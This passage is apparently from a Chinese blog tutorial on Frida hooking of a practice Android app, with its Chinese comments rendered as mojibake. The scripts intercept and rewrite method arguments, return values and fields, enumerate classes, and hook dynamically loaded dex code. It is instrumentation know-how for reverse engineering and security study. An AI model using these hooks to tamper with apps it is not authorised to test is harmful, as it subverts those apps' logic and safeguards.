class="string">&#x27;java.lang.String&#x27;</span>,<span class="string">&#x27;int&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">a,b</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Moneyï¼š&#x27;</span>,a,b);</span><br><span class="line">            a = <span class="string">&#x27;æ¬§å…ƒ&#x27;</span>;</span><br><span class="line">            b = <span class="number">2000</span>;</span><br><span class="line">            <span class="variable language_">this</span>.$init(a,b);   </span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">hooktest2</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// $init æ„é€ å‡½æ•°  overload é‡è½½</span></span><br></pre></td></tr></table></figure><h2 id="fridaå®ä¾‹åŒ–å¯¹è±¡">fridaå®ä¾‹åŒ–å¯¹è±¡</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//hookæ™®é€šå‡½æ•°ä¸ä¿®æ”¹å‡½æ•°å‚æ•°è¿”å›å€¼</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hooketst1</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">Utils</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.xiaojianbang.app.Utils&#x27;</span>);</span><br><span class="line">        <span class="title class_">Utils</span>.<span class="property">getCalc</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">a, b</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;getCalc: &#x27;</span>, a, b);</span><br><span class="line">            <span class="keyword">var</span> money = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.xiaojianbang.app.Money&quot;</span>);</span><br><span class="line">            <span class="keyword">var</span> infoStr = money.$new(<span class="string">&#x27;RMB&#x27;</span>, <span class="number">1000</span>).<span class="title function_">getInfo</span>();    <span class="comment">//å¯¹è±¡å®ä¾‹åŒ–,</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;infoStr: &#x27;</span>, infoStr);</span><br><span class="line">            a = <span class="number">2000</span>;</span><br><span class="line">            b = <span class="number">3000</span>;</span><br><span class="line">            <span class="keyword">var</span> retval = <span class="variable language_">this</span>.<span class="title function_">getCalc</span>(a, b);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;retval: &#x27;</span>, retval);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">4000</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Hookæ„é€ å‡½æ•°ä»¥åŠé‡è½½å‡½æ•°çš„HOOK</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hooktest2</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> money = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.xiaojianbang.app.Money&quot;</span>);</span><br><span class="line">        money.<span class="property">$init</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;int&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">str, num</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(str, num);</span><br><span class="line">            str = <span class="string">&quot;æ¬§å…ƒ&quot;</span>;</span><br><span class="line">            num = <span class="number">2000</span>;</span><br><span class="line">            <span class="variable language_">this</span>.$init(str, num);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;zxk1ng&#x27;</span>);</span><br><span class="line"><span class="title function_">hooktest1</span>();</span><br><span class="line"><span class="title function_">hooktest2</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Hookæ–¹æ³•çš„æ‰€æœ‰é‡è½½">Hookæ–¹æ³•çš„æ‰€æœ‰é‡è½½</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hooktest3</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> utils = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.xiaojianbang.app.Utils&quot;</span>);</span><br><span class="line">        <span class="comment">//console.log(utils.test.overloads.length);</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; utils.<span class="property">test</span>.<span class="property">overloads</span>.<span class="property">length</span>; i++)&#123;</span><br><span class="line">            utils.<span class="property">test</span>.<span class="property">overloads</span>[i].<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="comment">//console.log(JSON.stringify(arguments)); //è¾“å‡ºå‚æ•° </span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable language_">arguments</span>.<span class="property">length</span> == <span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;æ²¡æœ‰å‚æ•°&#x27;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="variable language_">arguments</span>));</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;è°ƒç”¨äº†æ²¡æœ‰å‚æ•°çš„&quot;</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable language_">arguments</span>.<span class="property">length</span> == <span class="number">1</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="variable language_">arguments</span>).<span class="title function_">indexOf</span>(<span class="string">&quot;Money&quot;</span>) != -<span class="number">1</span>)&#123;  <span class="comment">//æœ‰</span></span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;è°ƒç”¨äº†Moneyå‚æ•°çš„&#x27;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="variable language_">arguments</span>));</span><br><span class="line">                        <span class="keyword">return</span> <span class="string">&quot;è°ƒç”¨äº†Moneyå‚æ•°çš„&quot;</span>;</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;è°ƒç”¨äº†intå‚æ•°çš„&#x27;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="variable language_">arguments</span>));</span><br><span class="line">                        <span class="keyword">return</span> <span class="string">&quot;è°ƒç”¨äº†intå‚æ•°çš„&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;zxk1ng&#x27;</span>);</span><br><span class="line"><span class="title function_">hooktest3</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//argumentså¯ä»¥ç±»æ¯”æˆä¸€ä¸ªæ•°ç»„ç”¨ï¼Œarguments[0]...</span></span><br><span class="line"><span class="comment">//JSON.stringify JSONå¯¹è±¡æˆ–å€¼è½¬åŒ–ä¸ºjså­—ç¬¦ä¸²</span></span><br></pre></td></tr></table></figure><h2 id="Hookä¿®æ”¹ç±»çš„å­—æ®µ">Hookä¿®æ”¹ç±»çš„å­—æ®µ</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ä¿®æ”¹ç±»çš„å­—æ®µ</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hooktest5</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">//é™æ€å­—æ®µçš„ä¿®æ”¹</span></span><br><span class="line">        <span class="keyword">var</span> money = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.xiaojianbang.app.Money&quot;</span>);</span><br><span class="line">        money.<span class="property">flag</span>.<span class="property">value</span> = <span class="string">&quot;zxk1ng&quot;</span>;  <span class="comment">//ä¿®æ”¹é™æ€å­—æ®µç”¨.valueã€‚ money.flagè¢«fridaå°è£…ä¸ºå¯¹è±¡</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(money.<span class="property">flag</span>.<span class="property">value</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//éé™æ€å­—æ®µçš„ä¿®æ”¹</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.xiaojianbang.app.Money&quot;</span>, &#123;</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">obj</span>)&#123;  <span class="comment">//æ¯æ¬¡æ‰¾åˆ°ä¸€ä¸ªå¯¹è±¡å°±ä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°</span></span><br><span class="line">                obj.<span class="property">_name</span>.<span class="property">value</span> = <span class="string">&quot;ouyuan&quot;</span>; <span class="comment">//å­—æ®µåä¸å‡½æ•°åç›¸åŒ å‰é¢åŠ ä¸ªä¸‹åˆ’çº¿</span></span><br><span class="line">                obj.<span class="property">num</span>.<span class="property">value</span> = <span class="number">888</span>;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">hooktest5</span>();  </span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Hookå†…éƒ¨ç±»ä¸åŒ¿åç±»">Hookå†…éƒ¨ç±»ä¸åŒ¿åç±»</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//hookåŒ¿åç±»  åœ¨åŒ¿åç±»å‰é¢ + â€˜$â€™</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest6</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> innerClass = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.xiaojianbang.app.Money$innerClass&quot;</span>);</span><br><span class="line">        <span class="comment">//console.log(innerClass);</span></span><br><span class="line">        innerClass.<span class="property">$init</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">a, b</span>)&#123;</span><br><span class="line">            a = <span class="string">&quot;jingyi&quot;</span>;</span><br><span class="line">            b = <span class="number">666</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.$init(a, b);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> xxx = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.xiaojianbang.app.MainActivity$1&quot;</span>);</span><br><span class="line">        <span class="comment">//console.log(xxx);</span></span><br><span class="line">        xxx.<span class="property">getInfo</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;åŒ¿åç±»è¢«Hookäº†&quot;</span></span><br><span class="line">        &#125; </span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å¦‚ä½•å®šä½åŒ¿åå‡½æ•°ä½ç½®ï¼šçœ‹åŒ¿åç±»çš„å¤–éƒ¨ç±»ï¼Œåœ¨smaliä»£ç ä¸­æœç´¢ å¤–éƒ¨ç±»$1/2/3...</span></span><br></pre></td></tr></table></figure><h2 id="Hookå‚æ•°æ˜¯å¯¹è±¡çš„æƒ…å†µ">Hookå‚æ•°æ˜¯å¯¹è±¡çš„æƒ…å†µ</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hooktest6</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">Utils</span>=<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.xiaojianbang.app.Utils&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> retval= <span class="title class_">Utils</span>.<span class="title function_">test</span>();  <span class="comment">//ä¸»åŠ¨è°ƒç”¨</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(retval);</span><br><span class="line"></span><br><span class="line">        retval= <span class="title class_">Utils</span>.<span class="title function_">test</span>(<span class="number">111</span>);  <span class="comment">//ä¸»åŠ¨è°ƒç”¨</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(retval);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">Money</span>=<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.xiaojianbang.app.Money&#x27;</span>);</span><br><span class="line">        retval= <span class="title class_">Utils</span>.<span class="title function_">test</span>(<span class="title class_">Money</span>.$new(<span class="string">&#x27;zxk1ng&#x27;</span>,<span class="number">888</span>));   <span class="comment">//ä¸»åŠ¨è°ƒç”¨</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(retval);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;  </span><br><span class="line"><span class="title function_">hooktest6</span>();</span><br></pre></td></tr></table></figure><h2 id="æšä¸¾å·²ç»åŠ è½½çš„æ‰€æœ‰ç±»ä¸æšä¸¾ç±»çš„æ‰€æœ‰æ–¹æ³•">æšä¸¾å·²ç»åŠ è½½çš„æ‰€æœ‰ç±»ä¸æšä¸¾ç±»çš„æ‰€æœ‰æ–¹æ³•</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//æšä¸¾å·²åŠ è½½çš„æ‰€æœ‰ç±»ä¸æšä¸¾ç±»çš„æ‰€æœ‰æ–¹æ³•</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest7</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Java.enumerateLoadedClasses(&#123;   å›è°ƒ</span></span><br><span class="line">        <span class="comment">//     onMatch: function(name, handle)&#123;</span></span><br><span class="line">        <span class="comment">//         if(name.indexOf(&quot;com.xiaojianbang.app&quot;) != -1)&#123;</span></span><br><span class="line">        <span class="comment">//             console.log(name);</span></span><br><span class="line">        <span class="comment">//             var clazz = Java.use(name);</span></span><br><span class="line">        <span class="comment">//             console.log(clazz);</span></span><br><span class="line">        <span class="comment">//             var methods = clazz.class.getDeclaredMethods();</span></span><br><span class="line">                    </span><br><span class="line">        <span class="comment">//             for(var i = 0; i &lt; methods.length; i++)&#123;</span></span><br><span class="line">        <span class="comment">//                 console.log(methods[i]);</span></span><br><span class="line">        <span class="comment">//             &#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//         &#125;</span></span><br><span class="line">                </span><br><span class="line">        <span class="comment">//     &#125;,</span></span><br><span class="line">        <span class="comment">//     onComplete: function()&#123;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//     &#125;</span></span><br><span class="line">        <span class="comment">// &#125;);</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> classes = <span class="title class_">Java</span>.<span class="title function_">enumerateLoadedClassesSync</span>(); <span class="comment">//æ‰¾åˆ°æ‰€æœ‰ç±»å­˜åœ¨classes</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; classes.<span class="property">length</span>; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(classes[i].<span class="title function_">indexOf</span>(<span class="string">&quot;com.xiaojianbang.app&quot;</span>) != -<span class="number">1</span>)&#123;  <span class="comment">//æ‰¾æŸä¸ªåŒ…</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(classes[i]);</span><br><span class="line">                <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(classes[i]);</span><br><span class="line">                <span class="keyword">var</span> methods = clazz.<span class="property">class</span>.<span class="title function_">getDeclaredMethods</span>();</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; methods.<span class="property">length</span>; j++)&#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(methods[j]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//1.ç±»çš„å­—èŠ‚ç </span></span><br><span class="line"><span class="comment">//  Class.forName(&#x27;com.xiaojianbang.app.xxxx&#x27;)</span></span><br><span class="line"><span class="comment">//  obj.getClass</span></span><br><span class="line"><span class="comment">//  xxxx.class</span></span><br><span class="line"><span class="comment">//getDeclaredMethods  è·å¾—æ‰€æœ‰æ–¹æ³• getMethods è·å¾—publicçš„æ–¹æ³•</span></span><br></pre></td></tr></table></figure><h2 id="Hookç±»çš„æ‰€æœ‰æ–¹æ³•">Hookç±»çš„æ‰€æœ‰æ–¹æ³•</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest8</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">hookAll</span>(<span class="params">md5, methodName</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> k = <span class="number">0</span>; k &lt; md5[methodName].<span class="property">overloads</span>.<span class="property">length</span>; k++)&#123;</span><br><span class="line">            md5[methodName].<span class="property">overloads</span>[k].<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="variable language_">arguments</span>.<span class="property">length</span>; i++)&#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">arguments</span>[i]);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(methodName);</span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">this</span>[methodName].<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> md5 = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.xiaojianbang.app.MD5&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> methods = md5.<span class="property">class</span>.<span class="title function_">getDeclaredMethods</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; methods.<span class="property">length</span>; j++)&#123;</span><br><span class="line">            <span class="keyword">var</span> methodName = methods[j].<span class="title function_">getName</span>();</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(methodName);</span><br><span class="line">            <span class="title function_">hookAll</span>(md5, methodName)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="HookåŠ¨æ€åŠ è½½çš„dex">HookåŠ¨æ€åŠ è½½çš„dex</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//HookåŠ¨æ€åŠ è½½çš„dex</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest9</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">//å®‰å“7.0ä»¥ä¸Šæ‰å¯ä»¥ç”¨</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">enumerateClassLoaders</span>(&#123;</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">loader</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span>(loader.<span class="title function_">loadClass</span>(<span class="string">&quot;com.xiaojianbang.app.Dynamic&quot;</span>))&#123;</span><br><span class="line">                        <span class="title class_">Java</span>.<span class="property">classFactory</span>.<span class="property">loader</span> = loader; <span class="comment">//ä½¿ç”¨å…¶ä»–classloaderåŠ è½½ç±»</span></span><br><span class="line">                        <span class="keyword">var</span> <span class="title class_">Dynamic</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.xiaojianbang.app.Dynamic&quot;</span>);</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Dynamic</span>);</span><br><span class="line">                        <span class="title class_">Dynamic</span>.<span class="property">sayHello</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                            <span class="keyword">return</span> <span class="string">&quot;jingyi&quot;</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;  </span><br><span class="line">                &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                    </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            ,</span><br><span class="line">            <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">hookTest9</span>();</span><br></pre></td></tr></table></figure><h2 id="mapç±»å‹éå†ä¸ä¿®æ”¹">mapç±»å‹éå†ä¸ä¿®æ”¹</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest10</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">ShufferMap</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.xiaojianbang.app.ShufferMap&quot;</span>);</span><br><span class="line">        <span class="comment">//console.log(ShufferMap);</span></span><br><span class="line">        <span class="title class_">ShufferMap</span>.<span class="property">show</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">map</span>)&#123;</span><br><span class="line">            <span class="comment">//console.log(JSON.stringify(map));</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//Java mapçš„éå†</span></span><br><span class="line">            <span class="keyword">var</span> key = map.<span class="title function_">keySet</span>();</span><br><span class="line">            <span class="keyword">var</span> it = key.<span class="title function_">iterator</span>();</span><br><span class="line">            <span class="keyword">var</span> result = <span 